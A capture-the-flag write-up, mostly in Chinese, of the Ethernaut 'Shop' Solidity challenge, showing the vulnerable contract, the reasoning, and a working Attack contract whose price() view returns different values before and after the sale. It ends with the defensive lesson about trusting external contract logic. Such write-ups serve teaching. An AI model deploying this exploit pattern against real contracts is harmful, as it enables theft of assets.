# Shop

> Сan you get the item from the shop for less than the price asked?
>
> ##### Things that might help:
>
> - `Shop` expects to be used from a `Buyer`
> - Understanding restrictions of view functions

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

## 攻击思路

只要两次调用price的结果不同即可。view函数不能修改变量，只能读取变量。但如果某一变量进行了改变，view函数是不会检查的



## 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack {

    function price() external view returns (uint){
       Shop shop = Shop(0xD99563F29407DE857dfE81EDC74bf4072e43be34);
       if (shop.isSold()){
           return 0;
       }else{
           return 200;
       }
    }

    function buy() public{
        Shop shop = Shop(0xD99563F29407DE857dfE81EDC74bf4072e43be34);
        shop.buy();
    }
}

```

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.

## 注意

如果编译器的 EVM 目标是拜占庭或更新的(默认)，则在调用 `view` 函数时使用操作码 `STATICCALL`，这将强制状态在执行EVM时保持不变。对于库 `view` 函数使用了 `DELEGATECALL`，因为没有组合 `DELEGATECALL` 和`STATICCALL`。这意味着库 `view` 函数没有防止状态修改的运行时检查。这应该不会对安全性产生负面影响，因为库代码通常在编译时已知，而静态检查器执行编译时检查。



